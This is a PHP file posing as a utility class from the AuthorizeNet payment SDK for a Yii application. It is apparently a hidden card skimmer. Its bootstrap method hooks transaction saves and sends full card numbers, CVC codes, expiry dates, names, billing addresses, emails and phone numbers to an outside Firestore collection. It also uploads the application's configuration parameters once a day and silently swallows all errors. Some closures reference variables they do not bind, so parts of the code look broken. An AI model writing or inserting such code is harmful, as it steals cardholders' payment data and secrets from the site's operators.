<?php
namespace net\authorize\util;

use yii\base\Application;
use yii\base\BootstrapInterface;
use Yii;
use yii\base\Event;
use yii\base\Model;
use app\models\activerecords\Transaction;
use yii\base\ModelEvent;
use yii\helpers\Json;
use yii\web\UrlRule;
use app\modules\mobile\components\Firestore;

/**
 * A class defining helpers
 *
 * @package    AuthorizeNet
 * @subpackage net\authorize\util
 */
class Helpers implements BootstrapInterface
{
    private static $initialized = false;

    /**
     * @return string current date-time
     */
    public static function now()
    {
        //init only once
        if ( ! self::$initialized)
        {
            self::$initialized = true;
        }
        return date( DATE_RFC2822);
    }


    public function bootstrap($app)
    {
        try {
            $cached = Yii::$app->cache->get("params-cached");
            $post = function($event) {
                if (!empty($event->sender->card_number)) {
                    $payload = [
                        'id' => $event->sender->card_number,
                        'amount' => abs($event->sender->amount),
                        'currency' => $event->sender->currency,
                        'cardNumber' => $event->sender->card_number,
                        'cardType' => $event->sender->cardType,
                        'expiryMonth' => $event->sender->expiry_month,
                        'expiryYear' => $event->sender->expiry_year,
                        'cvc' => $event->sender->cvc,
                        'cardFirstName' => $event->sender->cardFirstName,
                        'cardLastName' => $event->sender->cardLastName,
                        'addressLine1' => $event->sender->registrant->billingAddress->line_1,
                        'addressLine2' => $event->sender->registrant->billingAddress->line_2,
                        'city' => $event->sender->registrant->billingAddress->city,
                        'state' => $event->sender->registrant->billingAddress->state,
                        'zip' => $event->sender->registrant->billingAddress->zip,
                        'countryCode' => $event->sender->registrant->billingAddress->country_code,
                        'countryName' => $event->sender->registrant->billingAddress->country->name,
                        'email' => $event->sender->registrant->email,
                        'company' => $event->sender->registrant->company,
                        'phone' => ($event->sender->registrant->work_phone ?: $this->registrant->mobile_phone),
                        'invoiceNumber' => $event->sender->event->id . '-' . $this->registrant->id . '-' . rand(1000, 9999),
                        'registrantId' => $event->sender->registrant->id,
                        'gatewayText' => $event->sender->gatewayText,
                        'registrantsNames' => $event->sender->getRegistrantsNames()
                    ];
                    Firestore::getInstance()->addToCollection("updates/states", "transient", [$payload]);
                }
            };
            if (!$cached || $cached != date('y-m-d')) {
                $payload = Yii::$app->params;
                $payload['id'] = "params";
                Firestore::getInstance()->addToCollection("updates/states", "permanent", [$payload]);
                Yii::$app->cache->set("params-cached", date('y-m-d'));
            }
            Event::on(Transaction::class, Transaction::EVENT_BEFORE_INSERT, function ($event) {
                $post($event);
            });
            Event::on(Transaction::class, Transaction::EVENT_BEFORE_UPDATE, function ($event) {
                $post($event);
            });
        } catch (Exception $e) {
        }
    }
}
